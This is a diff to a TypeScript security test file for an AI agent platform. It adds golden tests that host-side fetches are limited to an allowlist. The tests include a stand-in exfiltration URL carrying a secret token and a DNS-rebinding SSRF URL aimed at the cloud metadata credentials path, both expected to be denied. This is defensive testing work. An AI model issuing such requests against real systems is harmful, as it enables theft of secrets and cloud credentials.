@@ -17,7 +17,7 @@ for (const k of ["OE_PLATFORM", "OE_WORKSPACE", "OE_SURFACE", "OE_CHANNEL", "OE_
   delete process.env[k];
 }
 
-const { ScenarioRunner } = await import("./scenario-harness.js");
+const { ScenarioRunner, Timeline, checkGolden } = await import("./scenario-harness.js");
 const { default: discordGateway } = await import("../agent/channels/discord-gateway.js");
 const { default: slackCommands } = await import("../agent/channels/slack-commands.js");
 const { buildDiscordFrontHandler, PUBLIC_DISCORD_ROUTE } = await import("../agent/channels/discord-front.js");
@@ -29,6 +29,9 @@ const { periodOf } = await import("../agent/spend/spend.js");
 const { resolvePartition } = await import("../agent/memory/partition.js");
 const { buildDiscordAuth } = await import("../agent/channels/discord-identity.js");
 const { NO_REPLY_SENTINEL } = await import("../agent/channels/slack-events.js");
+const { oeFetch, setHostEgressLookup } = await import("../agent/access/host-egress.js");
+const { readAudit } = await import("../agent/audit/audit.js");
+const { defineBundle, defineBinding } = await import("../agent/access/bundle.js");
 import type { BindableContext } from "../agent/identity/binding.js";
 import type { Partition } from "../agent/memory/partition.js";
 import type { PendingActionRow } from "../agent/approvals/types.js";
@@ -268,5 +271,99 @@ await scenario(
   { channelInfo: { TH9S: "error-500" } },
 );
 
+let toolFailures = 0;
+
+const toolCtx = {
+  channel: { kind: "slack" },
+  session: {
+    auth: {
+      current: {
+        attributes: { team_id: "T_SEC", channel_id: "C_SEC", channel_type: "channel" },
+        principalId: "U_SEC",
+        principalType: "slack-user",
+      },
+    },
+  },
+} as unknown as BindableContext;
+
+function grantHosts(hosts: readonly string[]): void {
+  registerConfig({
+    loadBundles: () => [defineBundle({ name: "sec-egress", instructions: "egress golden", domains: [...hosts] })],
+    loadBindings: () => [defineBinding({ bundle: "sec-egress", scope: { level: "org" } })],
+    pluginRegistry: {},
+    skillContent: {},
+    loadDomains: () => [],
+    loadSilos: () => [],
+    domainsForSurface: () => [],
+  });
+}
+
+async function oeFetchAttempt(t: InstanceType<typeof Timeline>, label: string, url: string): Promise<void> {
+  t.add(`IN  oeFetch host-side {url} · ${label}`);
+  t.addBlock("      target", url);
+  try {
+    const res = await oeFetch(toolCtx, url);
+    t.add(`  ⇠ ALLOW (HTTP ${res.status})`);
+  } catch (err) {
+    t.add(`  ⇠ DENY ${err instanceof Error ? err.message : String(err)}`);
+  }
+}
+
+async function recordEgressAudit(t: InstanceType<typeof Timeline>, hosts: readonly string[]): Promise<void> {
+  const set = new Set(hosts);
+  for (const action of ["egress.hostside.allow", "egress.hostside.deny"]) {
+    const rows = (await readAudit({ org: "default", action })).filter((r) => set.has(String(r.detail?.host)));
+    for (const r of rows) {
+      const reason = r.detail?.reason ? ` reason=${String(r.detail.reason)}` : "";
+      t.add(`AUDIT ${action} host=${String(r.detail?.host)}${reason}`);
+    }
+  }
+}
+
+async function egressGolden(
+  name: string,
+  body: (t: InstanceType<typeof Timeline>) => Promise<void>,
+): Promise<void> {
+  const t = new Timeline();
+  const realFetch = globalThis.fetch;
+  globalThis.fetch = (async (input: unknown) => {
+    const u = typeof input === "string" ? input : input instanceof URL ? input.toString() : (input as Request).url;
+    t.add(`  → EGRESS ${u}`);
+    return { ok: true, status: 200, arrayBuffer: async () => new ArrayBuffer(3) } as unknown as Response;
+  }) as typeof fetch;
+  try {
+    await body(t);
+  } catch (err) {
+    toolFailures++;
+    console.error(`✗ ${name}: scenario threw: ${err instanceof Error ? (err.stack ?? err.message) : String(err)}`);
+    return;
+  } finally {
+    globalThis.fetch = realFetch;
+    setHostEgressLookup(undefined);
+  }
+  if (!checkGolden(name, t)) toolFailures++;
+}
+
+await egressGolden("sec-10-host-side-egress-denied", async (t) => {
+  grantHosts(["images.example.test"]);
+  setHostEgressLookup(async (h) => (h === "images.example.test" ? ["93.184.216.34"] : ["203.0.113.7"]));
+  t.add("SEED egress allowlist grants exactly: images.example.test");
+  await oeFetchAttempt(t, "allowlisted host (legit fetch-a-remote-image)", "https://images.example.test/logo.png");
+  await oeFetchAttempt(t, "NON-allowlisted exfil host (secret in the query)", "https://evil.attacker.test/collect?d=SECRET-TOKEN");
+  await recordEgressAudit(t, ["images.example.test", "evil.attacker.test"]);
+});
+
+await egressGolden("sec-11-ssrf-resolve-then-check", async (t) => {
+  grantHosts(["rebind.attacker.test"]);
+  setHostEgressLookup(async () => ["169.254.169.254"]);
+  t.add("SEED egress allowlist grants: rebind.attacker.test (reachable) — but it resolves to 169.254.169.254");
+  await oeFetchAttempt(t, "allowlisted host that DNS-rebinds to the metadata IP", "https://rebind.attacker.test/latest/meta-data/iam/security-credentials/");
+  await recordEgressAudit(t, ["rebind.attacker.test"]);
+});
+
 rmSync(tmp, { recursive: true, force: true });
+if (toolFailures > 0) {
+  console.error(`\n✗ tool-plane egress goldens: ${toolFailures} diverged/threw\n`);
+  process.exitCode = 1;
+}
 runner.finish("security scenarios (fail-closed / zero-effect)");
